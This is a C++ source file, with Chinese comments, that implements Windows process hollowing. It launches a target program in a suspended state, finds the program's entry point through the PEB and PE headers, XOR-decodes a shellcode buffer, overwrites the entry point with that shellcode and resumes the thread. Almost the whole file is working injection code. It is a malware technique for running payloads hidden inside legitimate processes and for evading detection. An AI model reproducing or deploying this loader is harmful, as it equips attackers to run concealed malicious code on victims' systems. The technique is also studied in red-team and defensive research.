#include "Hollowing.h"
#include "winternl.h"

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	IN  HANDLE ProcessHandle,
	IN  PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN  ULONG ProcessInformationLength,
	OUT PULONG ReturnLength    OPTIONAL
	);

// 利用 Process Hollowing 技术启动一个傀儡进程并进行 shellcode 注入
void HollowingWithShellcode(LPWSTR TargetPath, unsigned char* shellcodexored, int sizeofShellcode) {
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	std::wcout << "Running the target executable: " << TargetPath << std::endl;

	// 以 CREATE_SUSPENDED 的形式启动傀儡进程
	if (!CreateProcessW(NULL, TargetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		std::cerr << "Error: Unable to run the target executable. CreateProcess failed with error :" << GetLastError() << std::endl;
		return;
	}
	else {
		std::cout << "Process created in suspended state. PID: {" << pi.dwProcessId << "}" << std::endl;
	}

	PROCESS_BASIC_INFORMATION binfo;
	ULONG rlen;

	// NtQueryInformationProcess has no associated import library. You must use the LoadLibrary and GetProcAddress functions to dynamically link to Ntdll.dll.
	HMODULE hNtDll = GetModuleHandleA("ntdll");
	pfnNtQueryInformationProcess gNtQueryInformationProcess;
	gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");

	gNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &binfo, sizeof binfo, &rlen);

	VOID* baseImageAddr = (BYTE*)(binfo.PebBaseAddress) + 0x10;
	INT64 baseImage;
	if (!ReadProcessMemory(pi.hProcess, baseImageAddr, &baseImage, sizeof(INT64), NULL)) {
		std::cerr << "ERROR: ReadProcessMemory Failed with error code: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Got process information and located PEB address of process at {0x" << std::hex << binfo.PebBaseAddress << "}" << std::endl;
	}

	BYTE dataBuf[0x200];
	VOID* pbase = (VOID*)baseImage;
	if(!ReadProcessMemory(pi.hProcess, pbase, dataBuf, sizeof(dataBuf), NULL)){
		std::cerr << "ERROR: ReadProcessMemory Failed with error code: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Base address of Process: " << std::dec << pi.hProcess << " is {0x" << std::hex << baseImage << "}" << std::endl;
	}

	pDosH = (PIMAGE_DOS_HEADER)dataBuf;
	UINT32 e_lfanew = pDosH->e_lfanew;
	std::cout << "e_lfanew = " << e_lfanew << std::endl;

	pNtH = (PIMAGE_NT_HEADERS)((BYTE*)pDosH + e_lfanew);

	INT64 entrypointAddr = baseImage + pNtH->OptionalHeader.AddressOfEntryPoint;
	VOID* pentrypointAddr = (VOID*)entrypointAddr;
	std::cout << "Got executable entrypoint address: {0x" << entrypointAddr << "}" << std::endl;

	for (int i = 0; i < sizeofShellcode; i++) {
		*((unsigned char*)shellcodexored + i) = *((unsigned char*)shellcodexored + i) ^ 0x31;
	}
	std::cout << "shellcode XORED!" << std::endl;

	if (!WriteProcessMemory(pi.hProcess, pentrypointAddr, shellcodexored, sizeofShellcode, NULL)) {
		std::cerr << "ERROR: WriteProcessMemory Failed with error code: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Overwrote entrypoint with payload. " << std::endl;
	}

	if (!ResumeThread(pi.hThread)) {
		std::cerr << "ResumeThread failed: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "ResumeThread succeed" << std::endl;
	}
	system("pause");
}